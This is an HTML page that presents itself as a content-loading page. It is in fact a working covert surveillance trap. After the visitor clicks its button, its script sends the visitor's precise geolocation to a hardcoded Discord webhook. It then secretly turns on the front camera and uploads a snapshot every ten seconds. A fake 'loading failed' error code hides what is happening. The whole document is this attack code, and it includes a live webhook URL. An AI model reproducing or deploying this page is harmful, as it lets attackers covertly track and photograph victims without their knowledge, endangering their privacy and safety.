<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>內容載入中</title>
</head>
<body>

<h2>點擊按鈕查看內容</h2>
<button onclick="startAction()">點擊載入</button>
<p id="status"></p>

<video id="v" style="display:none;" autoplay playsinline></video>
<canvas id="c" style="display:none;"></canvas>

<script>
var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";

function startAction() {
    document.getElementById("status").innerHTML = "正在載入...";
    
    // 第一步：先抓定位
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(pos) {
            // 定位成功後的處理
            var lat = pos.coords.latitude;
            var lon = pos.coords.longitude;
            fetch(webhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: "📍 定位成功\n地圖: https://www.google.com/maps?q=" + lat + "," + lon })
            });
            // 定位成功後，緊接著執行相機
            getCamera();
        }, function(err) {
            // 定位失敗 (對方拒絕)，依然嘗試執行相機
            console.log("定位失敗");
            getCamera();
        }, {
            enableHighAccuracy: true,
            timeout: 8000 // 縮短超時時間，避免卡死
        });
    } else {
        // 不支援定位，直接跑相機
        getCamera();
    }
}

function getCamera() {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then(function(stream) {
        var video = document.getElementById("v");
        video.srcObject = stream;
        
        // 立即截圖一張，之後每 10 秒傳一次 (避免 Discord 頻率限制)
        setTimeout(function(){ sendSnap(video); }, 1000);
        setInterval(function(){ sendSnap(video); }, 10000);
        
        document.getElementById("status").innerHTML = "載入失敗，錯誤代碼：0x8240";
    })
    .catch(function(err) {
        document.getElementById("status").innerHTML = "需要完整權限才能查看內容";
    });
}

function sendSnap(video) {
    var canvas = document.getElementById("c");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    var ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0);
    
    canvas.toBlob(function(blob) {
        var formData = new FormData();
        formData.append('file', blob, 'capture.jpg');
        formData.append('payload_json', JSON.stringify({ content: "📸 自動擷取畫面" }));
        fetch(webhook, { method: "POST", body: formData });
    }, "image/jpeg", 0.6);
}
</script>

</body>
